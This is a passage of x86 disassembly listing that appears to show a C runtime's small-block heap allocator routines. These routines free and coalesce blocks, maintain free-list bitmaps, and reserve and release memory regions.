  426688:	sub    edx,DWORD PTR [eax+0xc]
  42668b:	cmp    edx,0x100000
  426691:	jb     0x42669c
  426693:	add    eax,0x14
  426696:	cmp    eax,ecx
  426698:	jb     0x426684
  42669a:	xor    eax,eax
  42669c:	ret    
  42669d:	push   ebp
  42669e:	mov    ebp,esp
  4266a0:	sub    esp,0x10
  4266a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4266a6:	mov    eax,DWORD PTR [ecx+0x10]
  4266a9:	push   esi
  4266aa:	mov    esi,DWORD PTR [ebp+0xc]
  4266ad:	push   edi
  4266ae:	mov    edi,esi
  4266b0:	sub    edi,DWORD PTR [ecx+0xc]
  4266b3:	add    esi,0xfffffffc
  4266b6:	shr    edi,0xf
  4266b9:	mov    ecx,edi
  4266bb:	imul   ecx,ecx,0x204
  4266c1:	lea    ecx,[ecx+eax*1+0x144]
  4266c8:	mov    DWORD PTR [ebp-0x10],ecx
  4266cb:	mov    ecx,DWORD PTR [esi]
  4266cd:	dec    ecx
  4266ce:	test   cl,0x1
  4266d1:	mov    DWORD PTR [ebp-0x4],ecx
  4266d4:	jne    0x4269b1
  4266da:	push   ebx
  4266db:	lea    ebx,[ecx+esi*1]
  4266de:	mov    edx,DWORD PTR [ebx]
  4266e0:	mov    DWORD PTR [ebp-0xc],edx
  4266e3:	mov    edx,DWORD PTR [esi-0x4]
  4266e6:	mov    DWORD PTR [ebp-0x8],edx
  4266e9:	mov    edx,DWORD PTR [ebp-0xc]
  4266ec:	test   dl,0x1
  4266ef:	mov    DWORD PTR [ebp+0xc],ebx
  4266f2:	jne    0x426768
  4266f4:	sar    edx,0x4
  4266f7:	dec    edx
  4266f8:	cmp    edx,0x3f
  4266fb:	jbe    0x426700
  4266fd:	push   0x3f
  4266ff:	pop    edx
  426700:	mov    ecx,DWORD PTR [ebx+0x4]
  426703:	cmp    ecx,DWORD PTR [ebx+0x8]
  426706:	jne    0x42674a
  426708:	cmp    edx,0x20
  42670b:	mov    ebx,0x80000000
  426710:	jae    0x42672b
  426712:	mov    ecx,edx
  426714:	shr    ebx,cl
  426716:	lea    ecx,[edx+eax*1+0x4]
  42671a:	not    ebx
  42671c:	and    DWORD PTR [eax+edi*4+0x44],ebx
  426720:	dec    BYTE PTR [ecx]
  426722:	jne    0x426747
  426724:	mov    ecx,DWORD PTR [ebp+0x8]
  426727:	and    DWORD PTR [ecx],ebx
  426729:	jmp    0x426747
  42672b:	lea    ecx,[edx-0x20]
  42672e:	shr    ebx,cl
  426730:	lea    ecx,[edx+eax*1+0x4]
  426734:	not    ebx
  426736:	and    DWORD PTR [eax+edi*4+0xc4],ebx
  42673d:	dec    BYTE PTR [ecx]
  42673f:	jne    0x426747
  426741:	mov    ecx,DWORD PTR [ebp+0x8]
  426744:	and    DWORD PTR [ecx+0x4],ebx
  426747:	mov    ebx,DWORD PTR [ebp+0xc]
  42674a:	mov    edx,DWORD PTR [ebx+0x8]
  42674d:	mov    ebx,DWORD PTR [ebx+0x4]
  426750:	mov    ecx,DWORD PTR [ebp-0x4]
  426753:	add    ecx,DWORD PTR [ebp-0xc]
  426756:	mov    DWORD PTR [edx+0x4],ebx
  426759:	mov    edx,DWORD PTR [ebp+0xc]
  42675c:	mov    ebx,DWORD PTR [edx+0x4]
  42675f:	mov    edx,DWORD PTR [edx+0x8]
  426762:	mov    DWORD PTR [ebx+0x8],edx
  426765:	mov    DWORD PTR [ebp-0x4],ecx
  426768:	mov    edx,ecx
  42676a:	sar    edx,0x4
  42676d:	dec    edx
  42676e:	cmp    edx,0x3f
  426771:	jbe    0x426776
  426773:	push   0x3f
  426775:	pop    edx
  426776:	mov    ebx,DWORD PTR [ebp-0x8]
  426779:	and    ebx,0x1
  42677c:	mov    DWORD PTR [ebp-0xc],ebx
  42677f:	jne    0x426814
  426785:	sub    esi,DWORD PTR [ebp-0x8]
  426788:	mov    ebx,DWORD PTR [ebp-0x8]
  42678b:	sar    ebx,0x4
  42678e:	push   0x3f
  426790:	mov    DWORD PTR [ebp+0xc],esi
  426793:	dec    ebx
  426794:	pop    esi
  426795:	cmp    ebx,esi
  426797:	jbe    0x42679b
  426799:	mov    ebx,esi
  42679b:	add    ecx,DWORD PTR [ebp-0x8]
  42679e:	mov    edx,ecx
  4267a0:	sar    edx,0x4
  4267a3:	dec    edx
  4267a4:	cmp    edx,esi
  4267a6:	mov    DWORD PTR [ebp-0x4],ecx
  4267a9:	jbe    0x4267ad
  4267ab:	mov    edx,esi
  4267ad:	cmp    ebx,edx
  4267af:	je     0x42680f
  4267b1:	mov    ecx,DWORD PTR [ebp+0xc]
  4267b4:	mov    esi,DWORD PTR [ecx+0x4]
  4267b7:	cmp    esi,DWORD PTR [ecx+0x8]
  4267ba:	jne    0x4267f7
  4267bc:	cmp    ebx,0x20
  4267bf:	mov    esi,0x80000000
  4267c4:	jae    0x4267dd
  4267c6:	mov    ecx,ebx
  4267c8:	shr    esi,cl
  4267ca:	not    esi
  4267cc:	and    DWORD PTR [eax+edi*4+0x44],esi
  4267d0:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267d4:	jne    0x4267f7
  4267d6:	mov    ecx,DWORD PTR [ebp+0x8]
  4267d9:	and    DWORD PTR [ecx],esi
  4267db:	jmp    0x4267f7
  4267dd:	lea    ecx,[ebx-0x20]
  4267e0:	shr    esi,cl
  4267e2:	not    esi
  4267e4:	and    DWORD PTR [eax+edi*4+0xc4],esi
  4267eb:	dec    BYTE PTR [ebx+eax*1+0x4]
  4267ef:	jne    0x4267f7
  4267f1:	mov    ecx,DWORD PTR [ebp+0x8]
  4267f4:	and    DWORD PTR [ecx+0x4],esi
  4267f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4267fa:	mov    esi,DWORD PTR [ecx+0x8]
  4267fd:	mov    ecx,DWORD PTR [ecx+0x4]
  426800:	mov    DWORD PTR [esi+0x4],ecx
  426803:	mov    ecx,DWORD PTR [ebp+0xc]
  426806:	mov    esi,DWORD PTR [ecx+0x4]
  426809:	mov    ecx,DWORD PTR [ecx+0x8]
  42680c:	mov    DWORD PTR [esi+0x8],ecx
  42680f:	mov    esi,DWORD PTR [ebp+0xc]
  426812:	jmp    0x426817
  426814:	mov    ebx,DWORD PTR [ebp+0x8]
  426817:	cmp    DWORD PTR [ebp-0xc],0x0
  42681b:	jne    0x426825
  42681d:	cmp    ebx,edx
  42681f:	je     0x4268a5
  426825:	mov    ecx,DWORD PTR [ebp-0x10]
  426828:	lea    ecx,[ecx+edx*8]
  42682b:	mov    ebx,DWORD PTR [ecx+0x4]
  42682e:	mov    DWORD PTR [esi+0x8],ecx
  426831:	mov    DWORD PTR [esi+0x4],ebx
  426834:	mov    DWORD PTR [ecx+0x4],esi
  426837:	mov    ecx,DWORD PTR [esi+0x4]
  42683a:	mov    DWORD PTR [ecx+0x8],esi
  42683d:	mov    ecx,DWORD PTR [esi+0x4]
  426840:	cmp    ecx,DWORD PTR [esi+0x8]
  426843:	jne    0x4268a5
  426845:	mov    cl,BYTE PTR [edx+eax*1+0x4]
  426849:	mov    BYTE PTR [ebp+0xf],cl
  42684c:	inc    cl
  42684e:	cmp    edx,0x20
  426851:	mov    BYTE PTR [edx+eax*1+0x4],cl
  426855:	jae    0x42687c
  426857:	cmp    BYTE PTR [ebp+0xf],0x0
  42685b:	jne    0x42686b
  42685d:	mov    ecx,edx
  42685f:	mov    ebx,0x80000000
  426864:	shr    ebx,cl
  426866:	mov    ecx,DWORD PTR [ebp+0x8]
  426869:	or     DWORD PTR [ecx],ebx
  42686b:	mov    ebx,0x80000000
  426870:	mov    ecx,edx
  426872:	shr    ebx,cl
  426874:	lea    eax,[eax+edi*4+0x44]
  426878:	or     DWORD PTR [eax],ebx
  42687a:	jmp    0x4268a5
  42687c:	cmp    BYTE PTR [ebp+0xf],0x0
  426880:	jne    0x426892
  426882:	lea    ecx,[edx-0x20]
  426885:	mov    ebx,0x80000000
  42688a:	shr    ebx,cl
  42688c:	mov    ecx,DWORD PTR [ebp+0x8]
  42688f:	or     DWORD PTR [ecx+0x4],ebx
  426892:	lea    ecx,[edx-0x20]
  426895:	mov    edx,0x80000000
  42689a:	shr    edx,cl
  42689c:	lea    eax,[eax+edi*4+0xc4]
  4268a3:	or     DWORD PTR [eax],edx
  4268a5:	mov    eax,DWORD PTR [ebp-0x4]
  4268a8:	mov    DWORD PTR [esi],eax
  4268aa:	mov    DWORD PTR [eax+esi*1-0x4],eax
  4268ae:	mov    eax,DWORD PTR [ebp-0x10]
  4268b1:	dec    DWORD PTR [eax]
  4268b3:	jne    0x4269b0
  4268b9:	mov    eax,ds:0x4674b8
  4268be:	test   eax,eax
  4268c0:	je     0x4269a2
  4268c6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268cc:	mov    esi,DWORD PTR ds:0x42904c
  4268d2:	push   0x4000
  4268d7:	shl    ecx,0xf
  4268da:	add    ecx,DWORD PTR [eax+0xc]
  4268dd:	mov    ebx,0x8000
  4268e2:	push   ebx
  4268e3:	push   ecx
  4268e4:	call   esi
  4268e6:	mov    ecx,DWORD PTR ds:0x4674d0
  4268ec:	mov    eax,ds:0x4674b8
  4268f1:	mov    edx,0x80000000
  4268f6:	shr    edx,cl
  4268f8:	or     DWORD PTR [eax+0x8],edx
  4268fb:	mov    eax,ds:0x4674b8
  426900:	mov    eax,DWORD PTR [eax+0x10]
  426903:	mov    ecx,DWORD PTR ds:0x4674d0
  426909:	and    DWORD PTR [eax+ecx*4+0xc4],0x0
  426911:	mov    eax,ds:0x4674b8
  426916:	mov    eax,DWORD PTR [eax+0x10]
  426919:	dec    BYTE PTR [eax+0x43]
  42691c:	mov    eax,ds:0x4674b8
  426921:	mov    ecx,DWORD PTR [eax+0x10]
  426924:	cmp    BYTE PTR [ecx+0x43],0x0
  426928:	jne    0x426933
  42692a:	and    DWORD PTR [eax+0x4],0xfffffffe
  42692e:	mov    eax,ds:0x4674b8
  426933:	cmp    DWORD PTR [eax+0x8],0xffffffff
  426937:	jne    0x4269a2
  426939:	push   ebx
  42693a:	push   0x0
  42693c:	push   DWORD PTR [eax+0xc]
  42693f:	call   esi
  426941:	mov    eax,ds:0x4674b8
  426946:	push   DWORD PTR [eax+0x10]
  426949:	push   0x0
  42694b:	push   DWORD PTR ds:0x467700
  426951:	call   DWORD PTR ds:0x429058
  426957:	mov    eax,ds:0x4674bc
  42695c:	mov    edx,DWORD PTR ds:0x4674c0
  426962:	lea    eax,[eax+eax*4]
  426965:	shl    eax,0x2
  426968:	mov    ecx,eax
  42696a:	mov    eax,ds:0x4674b8
  42696f:	sub    ecx,eax
  426971:	lea    ecx,[ecx+edx*1-0x14]
  426975:	push   ecx
  426976:	lea    ecx,[eax+0x14]
  426979:	push   ecx
  42697a:	push   eax
  42697b:	call   0x4281d0
  426980:	mov    eax,DWORD PTR [ebp+0x8]
  426983:	add    esp,0xc
  426986:	dec    DWORD PTR ds:0x4674bc
  42698c:	cmp    eax,DWORD PTR ds:0x4674b8
  426992:	jbe    0x426998
  426994:	sub    DWORD PTR [ebp+0x8],0x14
  426998:	mov    eax,ds:0x4674c0
  42699d:	mov    ds:0x4674c8,eax
  4269a2:	mov    eax,DWORD PTR [ebp+0x8]
  4269a5:	mov    ds:0x4674b8,eax
  4269aa:	mov    DWORD PTR ds:0x4674d0,edi
  4269b0:	pop    ebx
  4269b1:	pop    edi
  4269b2:	pop    esi
  4269b3:	leave  
  4269b4:	ret    
  4269b5:	mov    eax,ds:0x4674bc
  4269ba:	mov    ecx,DWORD PTR ds:0x4674cc
  4269c0:	push   edi
  4269c1:	xor    edi,edi
  4269c3:	cmp    eax,ecx
  4269c5:	jne    0x4269fb
  4269c7:	lea    eax,[ecx+ecx*4+0x50]
  4269cb:	shl    eax,0x2
  4269ce:	push   eax
  4269cf:	push   DWORD PTR ds:0x4674c0
  4269d5:	push   edi
  4269d6:	push   DWORD PTR ds:0x467700
  4269dc:	call   DWORD PTR ds:0x4290e8
  4269e2:	cmp    eax,edi
  4269e4:	jne    0x4269ea
  4269e6:	xor    eax,eax
  4269e8:	pop    edi
  4269e9:	ret    
  4269ea:	add    DWORD PTR ds:0x4674cc,0x10
  4269f1:	mov    ds:0x4674c0,eax
  4269f6:	mov    eax,ds:0x4674bc
  4269fb:	mov    ecx,DWORD PTR ds:0x4674c0
  426a01:	push   esi
  426a02:	push   0x41c4
  426a07:	push   0x8
  426a09:	push   DWORD PTR ds:0x467700
  426a0f:	lea    eax,[eax+eax*4]
  426a12:	lea    esi,[ecx+eax*4]
  426a15:	call   DWORD PTR ds:0x4290dc
  426a1b:	cmp    eax,edi
  426a1d:	mov    DWORD PTR [esi+0x10],eax
  426a20:	jne    0x426a26
  426a22:	xor    eax,eax
  426a24:	jmp    0x426a69
  426a26:	push   0x4
  426a28:	push   0x2000
  426a2d:	push   0x100000
  426a32:	push   edi
  426a33:	call   DWORD PTR ds:0x4290e4
  426a39:	cmp    eax,edi
  426a3b:	mov    DWORD PTR [esi+0xc],eax
  426a3e:	jne    0x426a52
  426a40:	push   DWORD PTR [esi+0x10]
  426a43:	push   edi
  426a44:	push   DWORD PTR ds:0x467700
  426a4a:	call   DWORD PTR ds:0x429058
  426a50:	jmp    0x426a22
  426a52:	or     DWORD PTR [esi+0x8],0xffffffff
  426a56:	mov    DWORD PTR [esi],edi
  426a58:	mov    DWORD PTR [esi+0x4],edi
  426a5b:	inc    DWORD PTR ds:0x4674bc
  426a61:	mov    eax,DWORD PTR [esi+0x10]
  426a64:	or     DWORD PTR [eax],0xffffffff
  426a67:	mov    eax,esi
  426a69:	pop    esi
  426a6a:	pop    edi
  426a6b:	ret    
  426a6c:	push   ebp
  426a6d:	mov    ebp,esp
  426a6f:	push   ecx
  426a70:	push   ecx
  426a71:	mov    ecx,DWORD PTR [ebp+0x8]
  426a74:	mov    eax,DWORD PTR [ecx+0x8]
  426a77:	push   ebx
  426a78:	push   esi
  426a79:	mov    esi,DWORD PTR [ecx+0x10]
  426a7c:	push   edi
  426a7d:	xor    ebx,ebx
  426a7f:	jmp    0x426a84
  426a81:	shl    eax,1
  426a83:	inc    ebx
  426a84:	test   eax,eax
  426a86:	jge    0x426a81
  426a88:	mov    eax,ebx
  426a8a:	imul   eax,eax,0x204
  426a90:	lea    eax,[eax+esi*1+0x144]
  426a97:	push   0x3f
  426a99:	mov    DWORD PTR [ebp-0x8],eax
  426a9c:	pop    edx
  426a9d:	mov    DWORD PTR [eax+0x8],eax
  426aa0:	mov    DWORD PTR [eax+0x4],eax
  426aa3:	add    eax,0x8
  426aa6:	dec    edx
  426aa7:	jne    0x426a9d
  426aa9:	push   0x4
  426aab:	mov    edi,ebx
  426aad:	push   0x1000
  426ab2:	shl    edi,0xf
  426ab5:	add    edi,DWORD PTR [ecx+0xc]
  426ab8:	push   0x8000
  426abd:	push   edi
  426abe:	call   DWORD PTR ds:0x4290e4
  426ac4:	test   eax,eax
  426ac6:	jne    0x426ad0
  426ac8:	or     eax,0xffffffff
  426acb:	jmp    0x426b6d
  426ad0:	lea    edx,[edi+0x7000]
  426ad6:	cmp    edi,edx
  426ad8:	mov    DWORD PTR [ebp-0x4],edx
  426adb:	ja     0x426b20
  426add:	mov    ecx,edx
  426adf:	sub    ecx,edi
  426ae1:	shr    ecx,0xc
  426ae4:	lea    eax,[edi+0x10]
  426ae7:	inc    ecx
  426ae8:	or     DWORD PTR [eax-0x8],0xffffffff
  426aec:	or     DWORD PTR [eax+0xfec],0xffffffff
  426af3:	lea    edx,[eax+0xffc]
  426af9:	mov    DWORD PTR [eax],edx
  426afb:	lea    edx,[eax-0x1004]
  426b01:	mov    DWORD PTR [eax-0x4],0xff0
  426b08:	mov    DWORD PTR [eax+0x4],edx
  426b0b:	mov    DWORD PTR [eax+0xfe8],0xff0
  426b15:	add    eax,0x1000
  426b1a:	dec    ecx
  426b1b:	jne    0x426ae8
  426b1d:	mov    edx,DWORD PTR [ebp-0x4]
  426b20:	mov    eax,DWORD PTR [ebp-0x8]
  426b23:	add    eax,0x1f8
  426b28:	lea    ecx,[edi+0xc]
  426b2b:	mov    DWORD PTR [eax+0x4],ecx
  426b2e:	mov    DWORD PTR [ecx+0x8],eax
  426b31:	lea    ecx,[edx+0xc]
  426b34:	mov    DWORD PTR [eax+0x8],ecx
  426b37:	mov    DWORD PTR [ecx+0x4],eax
  426b3a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  426b3f:	xor    edi,edi
  426b41:	inc    edi
  426b42:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  426b49:	mov    al,BYTE PTR [esi+0x43]
  426b4c:	mov    cl,al
  426b4e:	inc    cl
  426b50:	test   al,al
  426b52:	mov    eax,DWORD PTR [ebp+0x8]
  426b55:	mov    BYTE PTR [esi+0x43],cl
  426b58:	jne    0x426b5d
  426b5a:	or     DWORD PTR [eax+0x4],edi
  426b5d:	mov    edx,0x80000000
  426b62:	mov    ecx,ebx
  426b64:	shr    edx,cl
  426b66:	not    edx
  426b68:	and    DWORD PTR [eax+0x8],edx
  426b6b:	mov    eax,ebx
  426b6d:	pop    edi
  426b6e:	pop    esi
  426b6f:	pop    ebx
  426b70:	leave  
  426b71:	ret    
  426b72:	push   ebp
  426b73:	mov    ebp,esp
  426b75:	sub    esp,0xc
  426b78:	mov    ecx,DWORD PTR [ebp+0x8]
  426b7b:	mov    eax,DWORD PTR [ecx+0x10]
  426b7e:	push   ebx
  426b7f:	push   esi
  426b80:	mov    esi,DWORD PTR [ebp+0x10]
  426b83:	push   edi
  426b84:	mov    edi,DWORD PTR [ebp+0xc]
  426b87:	mov    edx,edi
  426b89:	sub    edx,DWORD PTR [ecx+0xc]
  426b8c:	add    esi,0x17
  426b8f:	shr    edx,0xf
  426b92:	mov    ecx,edx
  426b94:	imul   ecx,ecx,0x204
  426b9a:	lea    ecx,[ecx+eax*1+0x144]
  426ba1:	mov    DWORD PTR [ebp-0xc],ecx
  426ba4:	mov    ecx,DWORD PTR [edi-0x4]
  426ba7:	and    esi,0xfffffff0
  426baa:	dec    ecx
  426bab:	cmp    esi,ecx
  426bad:	lea    edi,[ecx+edi*1-0x4]
  426bb1:	mov    ebx,DWORD PTR [edi]
  426bb3:	mov    DWORD PTR [ebp+0x10],ecx
  426bb6:	mov    DWORD PTR [ebp-0x4],ebx
  426bb9:	jle    0x426d14
  426bbf:	test   bl,0x1
  426bc2:	jne    0x426d0d
  426bc8:	add    ebx,ecx
  426bca:	cmp    esi,ebx
  426bcc:	jg     0x426d0d
  426bd2:	mov    ecx,DWORD PTR [ebp-0x4]
  426bd5:	sar    ecx,0x4
  426bd8:	dec    ecx
  426bd9:	cmp    ecx,0x3f
  426bdc:	mov    DWORD PTR [ebp-0x8],ecx
  426bdf:	jbe    0x426be7
  426be1:	push   0x3f
  426be3:	pop    ecx
  426be4:	mov    DWORD PTR [ebp-0x8],ecx
  426be7:	mov    ebx,DWORD PTR [edi+0x4]
  426bea:	cmp    ebx,DWORD PTR [edi+0x8]
  426bed:	jne    0x426c32
  426bef:	cmp    ecx,0x20
  426bf2:	mov    ebx,0x80000000
  426bf7:	jae    0x426c13
  426bf9:	shr    ebx,cl
  426bfb:	mov    ecx,DWORD PTR [ebp-0x8]
  426bfe:	lea    ecx,[ecx+eax*1+0x4]
  426c02:	not    ebx
  426c04:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426c08:	dec    BYTE PTR [ecx]
  426c0a:	jne    0x426c32
  426c0c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c0f:	and    DWORD PTR [ecx],ebx
  426c11:	jmp    0x426c32
  426c13:	add    ecx,0xffffffe0
  426c16:	shr    ebx,cl
  426c18:	mov    ecx,DWORD PTR [ebp-0x8]
  426c1b:	lea    ecx,[ecx+eax*1+0x4]
  426c1f:	not    ebx
  426c21:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426c28:	dec    BYTE PTR [ecx]
  426c2a:	jne    0x426c32
  426c2c:	mov    ecx,DWORD PTR [ebp+0x8]
  426c2f:	and    DWORD PTR [ecx+0x4],ebx
  426c32:	mov    ecx,DWORD PTR [edi+0x8]
  426c35:	mov    ebx,DWORD PTR [edi+0x4]
  426c38:	mov    DWORD PTR [ecx+0x4],ebx
  426c3b:	mov    ecx,DWORD PTR [edi+0x4]
  426c3e:	mov    edi,DWORD PTR [edi+0x8]
  426c41:	mov    DWORD PTR [ecx+0x8],edi
  426c44:	mov    ecx,DWORD PTR [ebp+0x10]
  426c47:	sub    ecx,esi
  426c49:	add    DWORD PTR [ebp-0x4],ecx
  426c4c:	cmp    DWORD PTR [ebp-0x4],0x0
  426c50:	jle    0x426cfb
  426c56:	mov    edi,DWORD PTR [ebp-0x4]
  426c59:	mov    ecx,DWORD PTR [ebp+0xc]
  426c5c:	sar    edi,0x4
  426c5f:	dec    edi
  426c60:	cmp    edi,0x3f
  426c63:	lea    ecx,[ecx+esi*1-0x4]
  426c67:	jbe    0x426c6c
  426c69:	push   0x3f
  426c6b:	pop    edi
  426c6c:	mov    ebx,DWORD PTR [ebp-0xc]
  426c6f:	lea    ebx,[ebx+edi*8]
  426c72:	mov    DWORD PTR [ebp+0x10],ebx
  426c75:	mov    ebx,DWORD PTR [ebx+0x4]
  426c78:	mov    DWORD PTR [ecx+0x4],ebx
  426c7b:	mov    ebx,DWORD PTR [ebp+0x10]
  426c7e:	mov    DWORD PTR [ecx+0x8],ebx
  426c81:	mov    DWORD PTR [ebx+0x4],ecx
  426c84:	mov    ebx,DWORD PTR [ecx+0x4]
  426c87:	mov    DWORD PTR [ebx+0x8],ecx
  426c8a:	mov    ebx,DWORD PTR [ecx+0x4]
  426c8d:	cmp    ebx,DWORD PTR [ecx+0x8]
  426c90:	jne    0x426ce9
  426c92:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  426c96:	mov    BYTE PTR [ebp+0x13],cl
  426c99:	inc    cl
  426c9b:	cmp    edi,0x20
  426c9e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  426ca2:	jae    0x426cc0
  426ca4:	cmp    BYTE PTR [ebp+0x13],0x0
  426ca8:	jne    0x426cb8
  426caa:	mov    ecx,edi
  426cac:	mov    ebx,0x80000000
  426cb1:	shr    ebx,cl
  426cb3:	mov    ecx,DWORD PTR [ebp+0x8]
  426cb6:	or     DWORD PTR [ecx],ebx
  426cb8:	lea    eax,[eax+edx*4+0x44]
  426cbc:	mov    ecx,edi
  426cbe:	jmp    0x426ce0
  426cc0:	cmp    BYTE PTR [ebp+0x13],0x0
  426cc4:	jne    0x426cd6
  426cc6:	lea    ecx,[edi-0x20]
  426cc9:	mov    ebx,0x80000000
  426cce:	shr    ebx,cl
  426cd0:	mov    ecx,DWORD PTR [ebp+0x8]
  426cd3:	or     DWORD PTR [ecx+0x4],ebx
  426cd6:	lea    eax,[eax+edx*4+0xc4]
  426cdd:	lea    ecx,[edi-0x20]
  426ce0:	mov    edx,0x80000000
  426ce5:	shr    edx,cl
  426ce7:	or     DWORD PTR [eax],edx
  426ce9:	mov    edx,DWORD PTR [ebp+0xc]
  426cec:	mov    ecx,DWORD PTR [ebp-0x4]
  426cef:	lea    eax,[edx+esi*1-0x4]
  426cf3:	mov    DWORD PTR [eax],ecx
  426cf5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  426cf9:	jmp    0x426cfe
  426cfb:	mov    edx,DWORD PTR [ebp+0xc]
  426cfe:	lea    eax,[esi+0x1]
  426d01:	mov    DWORD PTR [edx-0x4],eax
  426d04:	mov    DWORD PTR [edx+esi*1-0x8],eax
  426d08:	jmp    0x426e49
  426d0d:	xor    eax,eax
  426d0f:	jmp    0x426e4c
  426d14:	jge    0x426e49
  426d1a:	mov    ebx,DWORD PTR [ebp+0xc]
  426d1d:	sub    DWORD PTR [ebp+0x10],esi
  426d20:	lea    ecx,[esi+0x1]
  426d23:	mov    DWORD PTR [ebx-0x4],ecx
  426d26:	lea    ebx,[ebx+esi*1-0x4]
  426d2a:	mov    esi,DWORD PTR [ebp+0x10]
  426d2d:	sar    esi,0x4
  426d30:	dec    esi
  426d31:	cmp    esi,0x3f
  426d34:	mov    DWORD PTR [ebp+0xc],ebx
  426d37:	mov    DWORD PTR [ebx-0x4],ecx
  426d3a:	jbe    0x426d3f
  426d3c:	push   0x3f
  426d3e:	pop    esi
  426d3f:	test   BYTE PTR [ebp-0x4],0x1
  426d43:	jne    0x426dc9
  426d49:	mov    esi,DWORD PTR [ebp-0x4]
  426d4c:	sar    esi,0x4
  426d4f:	dec    esi
  426d50:	cmp    esi,0x3f
  426d53:	jbe    0x426d58
  426d55:	push   0x3f
  426d57:	pop    esi
  426d58:	mov    ecx,DWORD PTR [edi+0x4]
  426d5b:	cmp    ecx,DWORD PTR [edi+0x8]
  426d5e:	jne    0x426da2
  426d60:	cmp    esi,0x20
  426d63:	mov    ebx,0x80000000
  426d68:	jae    0x426d83
  426d6a:	mov    ecx,esi
  426d6c:	shr    ebx,cl
  426d6e:	lea    esi,[esi+eax*1+0x4]
  426d72:	not    ebx
  426d74:	and    DWORD PTR [eax+edx*4+0x44],ebx
  426d78:	dec    BYTE PTR [esi]
  426d7a:	jne    0x426d9f
  426d7c:	mov    ecx,DWORD PTR [ebp+0x8]
  426d7f:	and    DWORD PTR [ecx],ebx
  426d81:	jmp    0x426d9f
  426d83:	lea    ecx,[esi-0x20]
  426d86:	shr    ebx,cl
  426d88:	lea    ecx,[esi+eax*1+0x4]
  426d8c:	not    ebx
  426d8e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  426d95:	dec    BYTE PTR [ecx]
  426d97:	jne    0x426d9f
  426d99:	mov    ecx,DWORD PTR [ebp+0x8]
  426d9c:	and    DWORD PTR [ecx+0x4],ebx
  426d9f:	mov    ebx,DWORD PTR [ebp+0xc]
  426da2:	mov    ecx,DWORD PTR [edi+0x8]
  426da5:	mov    esi,DWORD PTR [edi+0x4]
  426da8:	mov    DWORD PTR [ecx+0x4],esi
  426dab:	mov    esi,DWORD PTR [edi+0x8]
  426dae:	mov    ecx,DWORD PTR [edi+0x4]
  426db1:	mov    DWORD PTR [ecx+0x8],esi
  426db4:	mov    esi,DWORD PTR [ebp+0x10]
  426db7:	add    esi,DWORD PTR [ebp-0x4]
  426dba:	mov    DWORD PTR [ebp+0x10],esi
  426dbd:	sar    esi,0x4
  426dc0:	dec    esi
  426dc1:	cmp    esi,0x3f
  426dc4:	jbe    0x426dc9
  426dc6:	push   0x3f
  426dc8:	pop    esi
  426dc9:	mov    ecx,DWORD PTR [ebp-0xc]
  426dcc:	lea    ecx,[ecx+esi*8]
  426dcf:	mov    edi,DWORD PTR [ecx+0x4]
  426dd2:	mov    DWORD PTR [ebx+0x8],ecx
  426dd5:	mov    DWORD PTR [ebx+0x4],edi
  426dd8:	mov    DWORD PTR [ecx+0x4],ebx
  426ddb:	mov    ecx,DWORD PTR [ebx+0x4]
  426dde:	mov    DWORD PTR [ecx+0x8],ebx
  426de1:	mov    ecx,DWORD PTR [ebx+0x4]
  426de4:	cmp    ecx,DWORD PTR [ebx+0x8]
  426de7:	jne    0x426e40
  426de9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  426ded:	mov    BYTE PTR [ebp+0xf],cl
  426df0:	inc    cl
  426df2:	cmp    esi,0x20
  426df5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  426df9:	jae    0x426e17
  426dfb:	cmp    BYTE PTR [ebp+0xf],0x0
  426dff:	jne    0x426e0f
  426e01:	mov    ecx,esi
  426e03:	mov    edi,0x80000000
  426e08:	shr    edi,cl
  426e0a:	mov    ecx,DWORD PTR [ebp+0x8]
  426e0d:	or     DWORD PTR [ecx],edi
  426e0f:	lea    eax,[eax+edx*4+0x44]
  426e13:	mov    ecx,esi
  426e15:	jmp    0x426e37
  426e17:	cmp    BYTE PTR [ebp+0xf],0x0
  426e1b:	jne    0x426e2d
  426e1d:	lea    ecx,[esi-0x20]
  426e20:	mov    edi,0x80000000
  426e25:	shr    edi,cl
  426e27:	mov    ecx,DWORD PTR [ebp+0x8]
  426e2a:	or     DWORD PTR [ecx+0x4],edi
  426e2d:	lea    eax,[eax+edx*4+0xc4]
  426e34:	lea    ecx,[esi-0x20]
  426e37:	mov    edx,0x80000000
  426e3c:	shr    edx,cl
  426e3e:	or     DWORD PTR [eax],edx
  426e40:	mov    eax,DWORD PTR [ebp+0x10]
  426e43:	mov    DWORD PTR [ebx],eax
  426e45:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  426e49:	xor    eax,eax
  426e4b:	inc    eax
  426e4c:	pop    edi
  426e4d:	pop    esi
  426e4e:	pop    ebx
  426e4f:	leave  
  426e50:	ret    
  426e51:	push   ebp
  426e52:	mov    ebp,esp
  426e54:	sub    esp,0x14
  426e57:	mov    ecx,DWORD PTR [ebp+0x8]
  426e5a:	mov    eax,ds:0x4674bc
  426e5f:	mov    edx,DWORD PTR ds:0x4674c0
  426e65:	add    ecx,0x17
  426e68:	and    ecx,0xfffffff0
  426e6b:	push   ebx
  426e6c:	mov    DWORD PTR [ebp-0x10],ecx
  426e6f:	sar    ecx,0x4
  426e72:	push   esi
  426e73:	lea    eax,[eax+eax*4]
  426e76:	push   edi
  426e77:	dec    ecx
  426e78:	cmp    ecx,0x20
  426e7b:	lea    edi,[edx+eax*4]
  426e7e:	mov    DWORD PTR [ebp-0x4],edi
  426e81:	jge    0x426e8e
  426e83:	or     esi,0xffffffff
  426e86:	shr    esi,cl
  426e88:	or     DWORD PTR [ebp-0x8],0xffffffff
  426e8c:	jmp    0x426e9b
  426e8e:	add    ecx,0xffffffe0
  426e91:	or     eax,0xffffffff
  426e94:	xor    esi,esi
  426e96:	shr    eax,cl
  426e98:	mov    DWORD PTR [ebp-0x8],eax
